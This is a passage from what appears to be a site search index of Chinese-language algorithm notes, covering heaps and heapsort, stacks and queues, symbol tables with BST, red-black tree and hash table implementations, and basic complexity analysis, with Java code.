Heap(int maxN) { this.heap = (T[]) new Comparable[maxN + 1]; } public boolean isEmpty() { return N == 0; } public int size() { return N; } private boolean less(int i, int j) { return heap[i].compareTo(heap[j]) \u0026lt; 0; } private void swap(int i, int j) { T t = heap[i]; heap[i] = heap[j]; heap[j] = t; } } 2. 上浮和下沉    在堆中，当一个节点比父节点大，那么需要交换这个两个节点。交换后还可能比它新的父节点大，因此需要不断地进行比较和交换操作，把这种操作称为上浮。\n\nprivate void swim(int k) { while (k \u0026gt; 1 \u0026amp;\u0026amp; less(k / 2, k)) { swap(k / 2, k); k = k / 2; } } 类似地，当一个节点比子节点来得小，也需要不断地向下进行比较和交换操作，把这种操作称为下沉。一个节点如果有两个子节点，应当与两个子节点中最大那个节点进行交换。\n\nprivate void sink(int k) { while (2 * k \u0026lt;= N) { int j = 2 * k; if (j \u0026lt; N \u0026amp;\u0026amp; less(j, j + 1)) j++; if (!less(k, j)) break; swap(k, j); k = j; } } 3. 插入元素    将新元素放到数组末尾，然后上浮到合适的位置。\npublic void insert(Comparable v) { heap[++N] = v; swim(N); } 4. 删除最大元素    从数组顶端删除最大的元素，并将数组的最后一个元素放到顶端，并让这个元素下沉到合适的位置。\npublic T delMax() { T max = heap[1]; swap(1, N--); heap[N + 1] = null; sink(1); return max; } 5. 堆排序    把最大元素和当前堆中数组的最后一个元素交换位置，并且不删除它，那么就可以得到一个从尾到头的递减序列，从正向来看就是一个递增序列，这就是堆排序。\n5.1 构建堆    无序数组建立堆最直接的方法是从左到右遍历数组进行上浮操作。一个更高效的方法是从右至左进行下沉操作，如果一个节点的两个节点都已经是堆有序，那么进行下沉操作可以使得这个节点为根节点的堆有序。叶子节点不需要进行下沉操作，可以忽略叶子节点的元素，因此只需要遍历一半的元素即可。\n\n5.2 交换堆顶元素与最后一个元素    交换之后需要进行下沉操作维持堆的有序状态。\n\npublic class HeapSort\u0026lt;T extends Comparable\u0026lt;T\u0026gt;\u0026gt; extends Sort\u0026lt;T\u0026gt; { /** * 数组第 0 个位置不能有元素 */ @Override public void sort(T[] nums) { int N = nums.length - 1; for (int k = N / 2; k \u0026gt;= 1; k--) sink(nums, k, N); while (N \u0026gt; 1) { swap(nums, 1, N--); sink(nums, 1, N); } } private void sink(T[] nums, int k, int N) { while (2 * k \u0026lt;= N) { int j = 2 * k; if (j \u0026lt; N \u0026amp;\u0026amp; less(nums, j, j + 1)) j++; if (!less(nums, k, j)) break; swap(nums, k, j); k = j; } } private boolean less(T[] nums, int i, int j) { return nums[i].compareTo(nums[j]) \u0026lt; 0; } } 6. 分析    一个堆的高度为 logN，因此在堆中插入元素和删除最大元素的复杂度都为 logN。\n对于堆排序，由于要对 N 个节点进行下沉操作，因此复杂度为 NlogN。\n堆排序是一种原地排序，没有利用额外的空间。\n现代操作系统很少使用堆排序，因为它无法利用局部性原理进行缓存，也就是数组元素很少和相邻的元素进行比较和交换。\n小结    1. 排序算法的比较       算法 稳定性 时间复杂度 空间复杂度 备注     选择排序 × N2 1    冒泡排序 √ N2 1    插入排序 √ N ~ N2 1 时间复杂度和初始顺序有关   希尔排序 × N 的若干倍乘于递增序列的长度 1 改进版插入排序   快速排序 × NlogN logN    三向切分快速排序 × N ~ NlogN logN 适用于有大量重复主键   归并排序 √ NlogN N    堆排序 × NlogN 1 无法利用局部性原理    快速排序是最快的通用排序算法，它的内循环的指令很少，而且它还能利用缓存，因为它总是顺序地访问数据。它的运行时间近似为 ~cNlogN，这里的 c 比其它线性对数级别的排序算法都要小。\n使用三向切分快速排序，实际应用中可能出现的某些分布的输入能够达到线性级别，而其它排序算法仍然需要线性对数时间。\n2. Java 的排序算法实现    Java 主要排序方法为 java.util.Arrays.sort()，对于原始数据类型使用三向切分的快速排序，对于引用类型使用归并排序。\n"},{"id":362,"href":"/%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95%E7%AE%97%E6%B3%95-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/","title":"算法 - 栈和队列","parent":"算法","content":"算法 - 栈和队列     算法 - 栈和队列  栈  1. 数组实现 2. 链表实现   队列    栈    public interface MyStack\u0026lt;Item\u0026gt; extends Iterable\u0026lt;Item\u0026gt; { MyStack\u0026lt;Item\u0026gt; push(Item item); Item pop() throws Exception; boolean isEmpty(); int size(); } 1. 数组实现    public class ArrayStack\u0026lt;Item\u0026gt; implements MyStack\u0026lt;Item\u0026gt; { // 栈元素数组，只能通过转型来创建泛型数组  private Item[] a = (Item[]) new Object[1]; // 元素数量  private int N = 0; @Override public MyStack\u0026lt;Item\u0026gt; push(Item item) { check(); a[N++] = item; return this; } @Override public Item pop() throws Exception { if (isEmpty()) { throw new Exception(\u0026#34;stack is empty\u0026#34;); } Item item = a[--N]; check(); // 避免对象游离  a[N] = null; return item; } private void check() { if (N \u0026gt;= a.length) { resize(2 * a.length); } else if (N \u0026gt; 0 \u0026amp;\u0026amp; N \u0026lt;= a.length / 4) { resize(a.length / 2); } } /** * 调整数组大小，使得栈具有伸缩性 */ private void resize(int size) { Item[] tmp = (Item[]) new Object[size]; for (int i = 0; i \u0026lt; N; i++) { tmp[i] = a[i]; } a = tmp; } @Override public boolean isEmpty() { return N == 0; } @Override public int size() { return N; } @Override public Iterator\u0026lt;Item\u0026gt; iterator() { // 返回逆序遍历的迭代器  return new Iterator\u0026lt;Item\u0026gt;() { private int i = N; @Override public boolean hasNext() { return i \u0026gt; 0; } @Override public Item next() { return a[--i]; } }; } } 2. 链表实现    需要使用链表的头插法来实现，因为头插法中最后压入栈的元素在链表的开头，它的 next 指针指向前一个压入栈的元素，在弹出元素时就可以通过 next 指针遍历到前一个压入栈的元素从而让这个元素成为新的栈顶元素。\npublic class ListStack\u0026lt;Item\u0026gt; implements MyStack\u0026lt;Item\u0026gt; { private Node top = null; private int N = 0; private class Node { Item item; Node next; } @Override public MyStack\u0026lt;Item\u0026gt; push(Item item) { Node newTop = new Node(); newTop.item = item; newTop.next = top; top = newTop; N++; return this; } @Override public Item pop() throws Exception { if (isEmpty()) { throw new Exception(\u0026#34;stack is empty\u0026#34;); } Item item = top.item; top = top.next; N--; return item; } @Override public boolean isEmpty() { return N == 0; } @Override public int size() { return N; } @Override public Iterator\u0026lt;Item\u0026gt; iterator() { return new Iterator\u0026lt;Item\u0026gt;() { private Node cur = top; @Override public boolean hasNext() { return cur != null; } @Override public Item next() { Item item = cur.item; cur = cur.next; return item; } }; } } 队列    下面是队列的链表实现，需要维护 first 和 last 节点指针，分别指向队首和队尾。\n这里需要考虑 first 和 last 指针哪个作为链表的开头。因为出队列操作需要让队首元素的下一个元素成为队首，所以需要容易获取下一个元素，而链表的头部节点的 next 指针指向下一个元素，因此可以让 first 指针链表的开头。\npublic interface MyQueue\u0026lt;Item\u0026gt; extends Iterable\u0026lt;Item\u0026gt; { int size(); boolean isEmpty(); MyQueue\u0026lt;Item\u0026gt; add(Item item); Item remove() throws Exception; } public class ListQueue\u0026lt;Item\u0026gt; implements MyQueue\u0026lt;Item\u0026gt; { private Node first; private Node last; int N = 0; private class Node { Item item; Node next; } @Override public boolean isEmpty() { return N == 0; } @Override public int size() { return N; } @Override public MyQueue\u0026lt;Item\u0026gt; add(Item item) { Node newNode = new Node(); newNode.item = item; newNode.next = null; if (isEmpty()) { last = newNode; first = newNode; } else { last.next = newNode; last = newNode; } N++; return this; } @Override public Item remove() throws Exception { if (isEmpty()) { throw new Exception(\u0026#34;queue is empty\u0026#34;); } Node node = first; first = first.next; N--; if (isEmpty()) { last = null; } return node.item; } @Override public Iterator\u0026lt;Item\u0026gt; iterator() { return new Iterator\u0026lt;Item\u0026gt;() { Node cur = first; @Override public boolean hasNext() { return cur != null; } @Override public Item next() { Item item = cur.item; cur = cur.next; return item; } }; } } "},{"id":363,"href":"/%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95%E7%AE%97%E6%B3%95-%E7%9B%AE%E5%BD%95/","title":"算法 - 目录","parent":"算法","content":"算法目录     算法分析 排序 并查集 栈和队列 符号表 其它  参考资料     Sedgewick, Robert, and Kevin Wayne. Algorithms. Addison-Wesley Professional, 2011.  "},{"id":364,"href":"/%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95%E7%AE%97%E6%B3%95-%E7%AC%A6%E5%8F%B7%E8%A1%A8/","title":"算法 - 符号表","parent":"算法","content":"算法 - 符号表     算法 - 符号表  前言 初级实现  1. 链表实现无序符号表 2. 二分查找实现有序符号表   二叉查找树  1. get() 2. put() 3. 分析 4. floor() 5. rank() 6. min() 7. deleteMin() 8. delete() 9. keys() 10. 分析   2-3 查找树  1. 插入操作 2. 性质   红黑树  1. 左旋转 2. 右旋转 3. 颜色转换 4. 插入 5. 分析   散列表  1. 散列函数 2. 拉链法 3. 线性探测法   小结  1. 符号表算法比较 2. Java 的符号表实现 3. 稀疏向量乘法      前言    符号表（Symbol Table）是一种存储键值对的数据结构，可以支持快速查找操作。\n符号表分为有序和无序两种，有序符号表主要指支持 min()、max() 等根据键的大小关系来实现的操作。\n有序符号表的键需要实现 Comparable 接口。\npublic interface UnorderedST\u0026lt;Key, Value\u0026gt; { int size(); Value get(Key key); void put(Key key, Value value); void delete(Key key); } public interface OrderedST\u0026lt;Key extends Comparable\u0026lt;Key\u0026gt;, Value\u0026gt; { int size(); void put(Key key, Value value); Value get(Key key); Key min(); Key max(); int rank(Key key); List\u0026lt;Key\u0026gt; keys(Key l, Key h); } 初级实现    1. 链表实现无序符号表    public class ListUnorderedST\u0026lt;Key, Value\u0026gt; implements UnorderedST\u0026lt;Key, Value\u0026gt; { private Node first; private class Node { Key key; Value value; Node next; Node(Key key, Value value, Node next) { this.key = key; this.value = value; this.next = next; } } @Override public int size() { int cnt = 0; Node cur = first; while (cur != null) { cnt++; cur = cur.next; } return cnt; } @Override public void put(Key key, Value value) { Node cur = first; // 如果在链表中找到节点的键等于 key 就更新这个节点的值为 value  while (cur != null) { if (cur.key.equals(key)) { cur.value = value; return; } cur = cur.next; } // 否则使用头插法插入一个新节点  first = new Node(key, value, first); } @Override public void delete(Key key) { if (first == null) return; if (first.key.equals(key)) first = first.next; Node pre = first, cur = first.next; while (cur != null) { if (cur.key.equals(key)) { pre.next = cur.next; return; } pre = pre.next; cur = cur.next; } } @Override public Value get(Key key) { Node cur = first; while (cur != null) { if (cur.key.equals(key)) return cur.value; cur = cur.next; } return null; } } 2. 二分查找实现有序符号表    使用一对平行数组，一个存储键一个存储值。\n二分查找的 rank() 方法至关重要，当键在表中时，它能够知道该键的位置；当键不在表中时，它也能知道在何处插入新键。\n二分查找最多需要 logN+1 次比较，使用二分查找实现的符号表的查找操作所需要的时间最多是对数级别的。但是插入操作需要移动数组元素，是线性级别的。\npublic class BinarySearchOrderedST\u0026lt;Key extends Comparable\u0026lt;Key\u0026gt;, Value\u0026gt; implements OrderedST\u0026lt;Key, Value\u0026gt; { private Key[] keys; private Value[] values; private int N = 0; public BinarySearchOrderedST(int capacity) { keys = (Key[]) new Comparable[capacity]; values = (Value[]) new Object[capacity]; } @Override public int size() { return N; } @Override public int rank(Key key) { int l = 0, h = N - 1; while (l \u0026lt;= h) { int m = l + (h - l) / 2; int cmp = key.compareTo(keys[m]); if (cmp == 0) return m; else if (cmp \u0026lt; 0) h = m - 1; else l = m + 1; } return l; } @Override public List\u0026lt;Key\u0026gt; keys(Key l, Key h) { int index = rank(l); List\u0026lt;Key\u0026gt; list = new ArrayList\u0026lt;\u0026gt;(); while (keys[index].compareTo(h) \u0026lt;= 0) { list.add(keys[index]); index++; } return list; } @Override public void put(Key key, Value value) { int index = rank(key); // 如果找到已经存在的节点键为 key，就更新这个节点的值为 value  if (index \u0026lt; N \u0026amp;\u0026amp; keys[index].compareTo(key) == 0) { values[index] = value; return; } // 否则在数组中插入新的节点，需要先将插入位置之后的元素都向后移动一个位置  for (int j = N; j \u0026gt; index; j--) { keys[j] = keys[j - 1]; values[j] = values[j - 1]; } keys[index] = key; values[index] = value; N++; } @Override public Value get(Key key) { int index = rank(key); if (index \u0026lt; N \u0026amp;\u0026amp; keys[index].compareTo(key) == 0) return values[index]; return null; } @Override public Key min() { return keys[0]; } @Override public Key max() { return keys[N - 1]; } } 二叉查找树    二叉树 是一个空链接，或者是一个有左右两个链接的节点，每个链接都指向一颗子二叉树。\n\n二叉查找树 （BST）是一颗二叉树，并且每个节点的值都大于等于其左子树中的所有节点的值而小于等于右子树的所有节点的值。\nBST 有一个重要性质，就是它的中序遍历结果递增排序。\n\n基本数据结构：\npublic class BST\u0026lt;Key extends Comparable\u0026lt;Key\u0026gt;, Value\u0026gt; implements OrderedST\u0026lt;Key, Value\u0026gt; { protected Node root; protected class Node { Key key; Value val; Node left; Node right; // 以该节点为根的子树节点总数  int N; // 红黑树中使用  boolean color; Node(Key key, Value val, int N) { this.key = key; this.val = val; this.N = N; } } @Override public int size() { return size(root); } private int size(Node x) { if (x == null) return 0; return x.N; } protected void recalculateSize(Node x) { x.N = size(x.left) + size(x.right) + 1; } } 为了方便绘图，下文中二叉树的空链接不画出来。\n1. get()     如果树是空的，则查找未命中； 如果被查找的键和根节点的键相等，查找命中； 否则递归地在子树中查找：如果被查找的键较小就在左子树中查找，较大就在右子树中查找。  @Override public Value get(Key key) { return get(root, key); } private Value get(Node x, Key key) { if (x == null) return null; int cmp = key.compareTo(x.key); if (cmp == 0) return x.val; else if (cmp \u0026lt; 0) return get(x.left, key); else return get(x.right, key); } 2. put()    当插入的键不存在于树中，需要创建一个新节点，并且更新上层节点的链接指向该节点，使得该节点正确地链接到树中。\n\n@Override public void put(Key key, Value value) { root = put(root, key, value); } private Node put(Node x, Key key, Value value) { if (x == null) return new Node(key, value, 1); int cmp = key.compareTo(x.key); if (cmp == 0) x.val = value; else if (cmp \u0026lt; 0) x.left = put(x.left, key, value); else x.right = put(x.right, key, value); recalculateSize(x); return x; } 3. 分析    二叉查找树的算法运行时间取决于树的形状，而树的形状又取决于键被插入的先后顺序。\n最好的情况下树是完全平衡的，每条空链接和根节点的距离都为 logN。\n\n在最坏的情况下，树的高度为 N。\n\n4. floor()    floor(key)：小于等于键的最大键\n 如果键小于根节点的键，那么 floor(key) 一定在左子树中； 如果键大于根节点的键，需要先判断右子树中是否存在 floor(key)，如果存在就返回，否则根节点就是 floor(key)。  public Key floor(Key key) { Node x = floor(root, key); if (x == null) return null; return x.key; } private Node floor(Node x, Key key) { if (x == null) return null; int cmp = key.compareTo(x.key); if (cmp == 0) return x; if (cmp \u0026lt; 0) return floor(x.left, key); Node t = floor(x.right, key); return t != null ? t : x; } 5. rank()    rank(key) 返回 key 的排名。\n 如果键和根节点的键相等，返回左子树的节点数； 如果小于，递归计算在左子树中的排名； 如果大于，递归计算在右子树中的排名，加上左子树的节点数，再加上 1（根节点）。  @Override public int rank(Key key) { return rank(key, root); } private int rank(Key key, Node x) { if (x == null) return 0; int cmp = key.compareTo(x.key); if (cmp == 0) return size(x.left); else if (cmp \u0026lt; 0) return rank(key, x.left); else return 1 + size(x.left) + rank(key, x.right); } 6. min()    @Override public Key min() { return min(root).key; } private Node min(Node x) { if (x == null) return null; if (x.left == null) return x; return min(x.left); } 7. deleteMin()    令指向最小节点的链接指向最小节点的右子树。\n\npublic void deleteMin() { root = deleteMin(root); } public Node deleteMin(Node x) { if (x.left == null) return x.right; x.left = deleteMin(x.left); recalculateSize(x); return x; } 8. delete()     如果待删除的节点只有一个子树， 那么只需要让指向待删除节点的链接指向唯一的子树即可； 否则，让右子树的最小节点替换该节点。  \npublic void delete(Key key) { root = delete(root, key); } private Node delete(Node x, Key key) { if (x == null) return null; int cmp = key.compareTo(x.key); if (cmp \u0026lt; 0) x.left = delete(x.left, key); else if (cmp \u0026gt; 0) x.right = delete(x.right, key); else { if (x.right == null) return x.left; if (x.left == null) return x.right; Node t = x; x = min(t.right); x.right = deleteMin(t.right); x.left = t.left; } recalculateSize(x); return x; } 9. keys()    利用二叉查找树中序遍历的结果为递增的特点。\n@Override public List\u0026lt;Key\u0026gt; keys(Key l, Key h) { return keys(root, l, h); } private List\u0026lt;Key\u0026gt; keys(Node x, Key l, Key h) { List\u0026lt;Key\u0026gt; list = new ArrayList\u0026lt;\u0026gt;(); if (x == null) return list; int cmpL = l.compareTo(x.key); int cmpH = h.compareTo(x.key); if (cmpL \u0026lt; 0) list.addAll(keys(x.left, l, h)); if (cmpL \u0026lt;= 0 \u0026amp;\u0026amp; cmpH \u0026gt;= 0) list.add(x.key); if (cmpH \u0026gt; 0) list.addAll(keys(x.right, l, h)); return list; } 10. 分析    二叉查找树所有操作在最坏的情况下所需要的时间都和树的高度成正比。\n2-3 查找树    2-3 查找树引入了 2- 节点和 3- 节点，目的是为了让树平衡。一颗完美平衡的 2-3 查找树的所有空链接到根节点的距离应该是相同的。\n\n1. 插入操作    插入操作和 BST 的插入操作有很大区别，BST 的插入操作是先进行一次未命中的查找，然后再将节点插入到对应的空链接上。但是 2-3 查找树如果也这么做的话，那么就会破坏了平衡性。它是将新节点插入到叶子节点上。\n根据叶子节点的类型不同，有不同的处理方式：\n 如果插入到 2- 节点上，那么直接将新节点和原来的节点组成 3- 节点即可。  \n 如果是插入到 3- 节点上，就会产生一个临时 4- 节点时，需要将 4- 节点分裂成 3 个 2- 节点，并将中间的 2- 节点移到上层节点中。如果上移操作继续产生临时 4- 节点则一直进行分裂上移，直到不存在临时 4- 节点。  \n2. 性质    2-3 查找树插入操作的变换都是局部的，除了相关的节点和链接之外不必修改或者检查树的其它部分，而这些局部变换不会影响树的全局有序性和平衡性。\n2-3 查找树的查找和插入操作复杂度和插入顺序无关，在最坏的情况下查找和插入操作访问的节点必然不超过 logN 个，含有 10 亿个节点的 2-3 查找树最多只需要访问 30 个节点就能进行任意的查找和插入操作。\n红黑树    红黑树是 2-3 查找树，但它不需要分别定义 2- 节点和 3- 节点，而是在普通的二叉查找树之上，为节点添加颜色。指向一个节点的链接颜色如果为红色，那么这个节点和上层节点表示的是一个 3- 节点，而黑色则是普通链接。\n\n红黑树具有以下性质：\n 红链接都为左链接； 完美黑色平衡，即任意空链接到根节点的路径上的黑链接数量相同。  画红黑树时可以将红链接画平。\n\npublic class RedBlackBST\u0026lt;Key extends Comparable\u0026lt;Key\u0026gt;, Value\u0026gt; extends BST\u0026lt;Key, Value\u0026gt; { private static final boolean RED = true; private static final boolean BLACK = false; private boolean isRed(Node x) { if (x == null) return false; return x.color == RED; } } 1. 左旋转    因为合法的红链接都为左链接，如果出现右链接为红链接，那么就需要进行左旋转操作。\n\npublic Node rotateLeft(Node h) { Node x = h.right; h.right = x.left; x.left = h; x.color = h.color; h.color = RED; x.N = h.N; recalculateSize(h); return x; } 2. 右旋转    进行右旋转是为了转换两个连续的左红链接，这会在之后的插入过程中探讨。\n\npublic Node rotateRight(Node h) { Node x = h.left; h.left = x.right; x.right = h; x.color = h.color; h.color = RED; x.N = h.N; recalculateSize(h); return x; } 3. 颜色转换    一个 4- 节点在红黑树中表现为一个节点的左右子节点都是红色的。分裂 4- 节点除了需要将子节点的颜色由红变黑之外，同时需要将父节点的颜色由黑变红，从 2-3 树的角度看就是将中间节点移到上层节点。\n\nvoid flipColors(Node h) { h.color = RED; h.left.color = BLACK; h.right.color = BLACK; } 4. 插入    先将一个节点按二叉查找树的方法插入到正确位置，然后再进行如下颜色操作：\n 如果右子节点是红色的而左子节点是黑色的，进行左旋转； 如果左子节点是红色的，而且左子节点的左子节点也是红色的，进行右旋转； 如果左右子节点均为红色的，进行颜色转换。  \n@Override public void put(Key key, Value value) { root = put(root, key, value); root.color = BLACK; } private Node put(Node x, Key key, Value value) { if (x == null) { Node node = new Node(key, value, 1); node.color = RED; return node; } int cmp = key.compareTo(x.key); if (cmp == 0) x.val = value; else if (cmp \u0026lt; 0) x.left = put(x.left, key, value); else x.right = put(x.right, key, value); if (isRed(x.right) \u0026amp;\u0026amp; !isRed(x.left)) x = rotateLeft(x); if (isRed(x.left) \u0026amp;\u0026amp; isRed(x.left.left)) x = rotateRight(x); if (isRed(x.left) \u0026amp;\u0026amp; isRed(x.right)) flipColors(x); recalculateSize(x); return x; } 可以看到该插入操作和二叉查找树的插入操作类似，只是在最后加入了旋转和颜色变换操作即可。\n根节点一定为黑色，因为根节点没有上层节点，也就没有上层节点的左链接指向根节点。flipColors() 有可能会使得根节点的颜色变为红色，每当根节点由红色变成黑色时树的黑链接高度加 1.\n5. 分析    一颗大小为 N 的红黑树的高度不会超过 2logN。最坏的情况下是它所对应的 2-3 树，构成最左边的路径节点全部都是 3- 节点而其余都是 2- 节点。\n红黑树大多数的操作所需要的时间都是对数级别的。\n散列表    散列表类似于数组，可以把散列表的散列值看成数组的索引值。访问散列表和访问数组元素一样快速，它可以在常数时间内实现查找和插入操作。\n由于无法通过散列值知道键的大小关系，因此散列表无法实现有序性操作。\n1. 散列函数    对于一个大小为 M 的散列表，散列函数能够把任意键转换为 [0, M-1] 内的正整数，该正整数即为 hash 值。\n散列表存在冲突，也就是两个不同的键可能有相同的 hash 值。\n散列函数应该满足以下三个条件：\n 一致性：相等的键应当有相等的 hash 值，两个键相等表示调用 equals() 返回的值相等。 高效性：计算应当简便，有必要的话可以把 hash 值缓存起来，在调用 hash 函数时直接返回。 均匀性：所有键的 hash 值应当均匀地分布到 [0, M-1] 之间，如果不能满足这个条件，有可能产生很多冲突，从而导致散列表的性能下降。  除留余数法可以将整数散列到 [0, M-1] 之间，例如一个正整数 k，计算 k%M 既可得到一个 [0, M-1] 之间的 hash 值。注意 M 最好是一个素数，否则无法利用键包含的所有信息。例如 M 为 10k，那么只能利用键的后 k 位。\n对于其它数，可以将其转换成整数的形式，然后利用除留余数法。例如对于浮点数，可以将其的二进制形式转换成整数。\n对于多部分组合的类型，每个部分都需要计算 hash 值，这些 hash 值都具有同等重要的地位。为了达到这个目的，可以将该类型看成 R 进制的整数，每个部分都具有不同的权值。\n例如，字符串的散列函数实现如下：\nint hash = 0; for (int i = 0; i \u0026lt; s.length(); i++) hash = (R * hash + s.charAt(i)) % M; 再比如，拥有多个成员的自定义类的哈希函数如下：\nint hash = (((day * R + month) % M) * R + year) % M; R 通常取 31。\nJava 中的 hashCode() 实现了哈希函数，但是默认使用对象的内存地址值。在使用 hashCode() 时，应当结合除留余数法来使用。因为内存地址是 32 位整数，我们只需要 31 位的非负整数，因此应当屏蔽符号位之后再使用除留余数法。\nint hash = (x.hashCode() \u0026amp; 0x7fffffff) % M; 使用 Java 的 HashMap 等自带的哈希表实现时，只需要去实现 Key 类型的 hashCode() 函数即可。Java 规定 hashCode() 能够将键均匀分布于所有的 32 位整数，Java 中的 String、Integer 等对象的 hashCode() 都能实现这一点。以下展示了自定义类型如何实现 hashCode()：\npublic class Transaction { private final String who; private final Date when; private final double amount; public Transaction(String who, Date when, double amount) { this.who = who; this.when = when; this.amount = amount; } public int hashCode() { int hash = 17; int R = 31; hash = R * hash + who.hashCode(); hash = R * hash + when.hashCode(); hash = R * hash + ((Double) amount).hashCode(); return hash; } } 2. 拉链法    拉链法使用链表来存储 hash 值相同的键，从而解决冲突。\n查找需要分两步，首先查找 Key 所在的链表，然后在链表中顺序查找。\n对于 N 个键，M 条链表 (N\u0026gt;M)，如果哈希函数能够满足均匀性的条件，每条链表的大小趋向于 N/M，因此未命中的查找和插入操作所需要的比较次数为 ~N/M。\n\n3. 线性探测法    线性探测法使用空位来解决冲突，当冲突发生时，向前探测一个空位来存储冲突的键。\n使用线性探测法，数组的大小 M 应当大于键的个数 N（M\u0026gt;N)。\n\npublic class LinearProbingHashST\u0026lt;Key, Value\u0026gt; implements UnorderedST\u0026lt;Key, Value\u0026gt; { private int N = 0; private int M = 16; private Key[] keys; private Value[] values; public LinearProbingHashST() { init(); } public LinearProbingHashST(int M) { this.M = M; init(); } private void init() { keys = (Key[]) new Object[M]; values = (Value[]) new Object[M]; } private int hash(Key key) { return (key.hashCode() \u0026amp; 0x7fffffff) % M; } } 3.1 查找    public Value get(Key key) { for (int i = hash(key); keys[i] != null; i = (i + 1) % M) if (keys[i].equals(key)) return values[i]; return null; } 3.2 插入    public void put(Key key, Value value) { resize(); putInternal(key, value); } private void putInternal(Key key, Value value) { int i; for (i = hash(key); keys[i] != null; i = (i + 1) % M) if (keys[i].equals(key)) { values[i] = value; return; } keys[i] = key; values[i] = value; N++; } 3.3 删除    删除操作应当将右侧所有相邻的键值对重新插入散列表中。\npublic void delete(Key key) { int i = hash(key); while (keys[i] != null \u0026amp;\u0026amp; !key.equals(keys[i])) i = (i + 1) % M; // 不存在，直接返回  if (keys[i] == null) return; keys[i] = null; values[i] = null; // 将之后相连的键值对重新插入  i = (i + 1) % M; while (keys[i] != null) { Key keyToRedo = keys[i]; Value valToRedo = values[i]; keys[i] = null; values[i] = null; N--; putInternal(keyToRedo, valToRedo); i = (i + 1) % M; } N--; resize(); } 3.5 调整数组大小    线性探测法的成本取决于连续条目的长度，连续条目也叫聚簇。当聚簇很长时，在查找和插入时也需要进行很多次探测。例如下图中 2~4 位置就是一个聚簇。\n\nα = N/M，把 α 称为使用率。理论证明，当 α 小于 1/2 时探测的预计次数只在 1.5 到 2.5 之间。为了保证散列表的性能，应当调整数组的大小，使得 α 在 [1/4, 1/2] 之间。\nprivate void resize() { if (N \u0026gt;= M / 2) resize(2 * M); else if (N \u0026lt;= M / 8) resize(M / 2); } private void resize(int cap) { LinearProbingHashST\u0026lt;Key, Value\u0026gt; t = new LinearProbingHashST\u0026lt;Key, Value\u0026gt;(cap); for (int i = 0; i \u0026lt; M; i++) if (keys[i] != null) t.putInternal(keys[i], values[i]); keys = t.keys; values = t.values; M = t.M; } 小结    1. 符号表算法比较       算法 插入 查找 是否有序     链表实现的无序符号表 N N yes   二分查找实现的有序符号表 N logN yes   二叉查找树 logN logN yes   2-3 查找树 logN logN yes   拉链法实现的散列表 N/M N/M no   线性探测法实现的散列表 1 1 no    应当优先考虑散列表，当需要有序性操作时使用红黑树。\n2. Java 的符号表实现     java.util.TreeMap：红黑树 java.util.HashMap：拉链法的散列表  3. 稀疏向量乘法    当向量为稀疏向量时，可以使用符号表来存储向量中的非 0 索引和值，使得乘法运算只需要对那些非 0 元素进行即可。\npublic class SparseVector { private HashMap\u0026lt;Integer, Double\u0026gt; hashMap; public SparseVector(double[] vector) { hashMap = new HashMap\u0026lt;\u0026gt;(); for (int i = 0; i \u0026lt; vector.length; i++) if (vector[i] != 0) hashMap.put(i, vector[i]); } public double get(int i) { return hashMap.getOrDefault(i, 0.0); } public double dot(SparseVector other) { double sum = 0; for (int i : hashMap.keySet()) sum += this.get(i) * other.get(i); return sum; } } "},{"id":365,"href":"/%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95%E7%AE%97%E6%B3%95-%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/","title":"算法 - 算法分析","parent":"算法","content":"算法 - 算法分析     算法 - 算法分析  数学模型  1. 近似 2. 增长数量级 3. 内循环 4. 成本模型   注意事项  1. 大常数 2. 缓存 3. 对最坏情况下的性能的保证 4. 随机化算法 5. 均摊分析   ThreeSum  1. ThreeSumSlow 2. ThreeSumBinarySearch 3. ThreeSumTwoPointer   倍率实验    数学模型    1. 近似    N3/6-N2/2+N/3 ~ N3/6。使用 ~f(N) 来表示所有随着 N 的增大除以 f(N) 的结果趋近于 1 的函数。\n2. 增长数量级    N3/6-N2/2+N/3 的增长数量级为 O(N3)。增长数量级将算法与它的具体实现隔离开来，一个算法的增长数量级为 O(N3) 与它是否用 Java 实现，是否运行于特定计算机上无关。\n3. 内循环    执行最频繁的指令决定了程序执行的总时间，把这些指令称为程序的内循环。\n4. 成本模型    使用成本模型来评估算法，例如数组的访问次数就是一种成本模型。\n注意事项    1. 大常数    在求近似时，如果低级项的常数系数很大，那么近似的结果是错误的。\n2. 缓存    计算机系统会使用缓存技术来组织内存，访问数组相邻的元素会比访问不相邻的元素快很多。\n3. 对最坏情况下的性能的保证    在核反应堆、心脏起搏器或者刹车控制器中的软件，最坏情况下的性能是十分重要的。\n4. 随机化算法    通过打乱输入，去除算法对输入的依赖。\n5. 均摊分析    将所有操作的总成本除于操作总数来将成本均摊。例如对一个空栈进行 N 次连续的 push() 调用需要访问数组的次数为 N+4+8+16+\u0026hellip;+2N=5N-4（N 是向数组写入元素的次数，其余都是调整数组大小时进行复制需要的访问数组次数），均摊后访问数组的平均次数为常数。\nThreeSum    ThreeSum 用于统计一个数组中和为 0 的三元组数量。\npublic interface ThreeSum { int count(int[] nums); } 1. ThreeSumSlow    该算法的内循环为 if (nums[i] + nums[j] + nums[k] == 0) 语句，总共执行的次数为 N(N-1)(N-2) = N3/6-N2/2+N/3，因此它的近似执行次数为 ~N3/6，增长数量级为 O(N3)。\npublic class ThreeSumSlow implements ThreeSum { @Override public int count(int[] nums) { int N = nums.length; int cnt = 0; for (int i = 0; i \u0026lt; N; i++) { for (int j = i + 1; j \u0026lt; N; j++) { for (int k = j + 1; k \u0026lt; N; k++) { if (nums[i] + nums[j] + nums[k] == 0) { cnt++; } } } } return cnt; } } 2. ThreeSumBinarySearch    将数组进行排序，对两个元素求和，并用二分查找方法查找是否存在该和的相反数，如果存在，就说明存在和为 0 的三元组。\n应该注意的是，只有数组不含有相同元素才能使用这种解法，否则二分查找的结果会出错。\n该方法可以将 ThreeSum 算法增长数量级降低为 O(N2logN)。\npublic class ThreeSumBinarySearch implements ThreeSum { @Override public int count(int[] nums) { Arrays.sort(nums); int N = nums.length; int cnt = 0; for (int i = 0; i \u0026lt; N; i++) { for (int j = i + 1; j \u0026lt; N; j++) { int target = -nums[i] - nums[j]; int index = BinarySearch.search(nums, target); // 